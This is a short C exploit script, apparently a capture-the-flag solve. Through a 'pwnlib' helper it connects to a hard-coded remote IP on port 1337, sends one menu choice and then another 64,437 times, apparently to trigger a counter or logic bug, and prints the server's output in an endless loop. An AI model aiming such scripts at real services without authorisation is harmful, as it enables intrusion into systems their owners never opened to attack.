#include <stdio.h>
#include "../pwnlib.h"

void printGet(PwnS* p) {
    char *buf = pwnreadline(p);
    printf("%s\n", buf);
    free(buf);
}


int main() {
    int i;
    PwnS* r = pwnremote("34.77.200.242", 1337);
    pwnsendline(r, "1");
    for (i = 0; i < 64437; i++)
        pwnsendline(r, "2");
    while(1)
        printGet(r);
}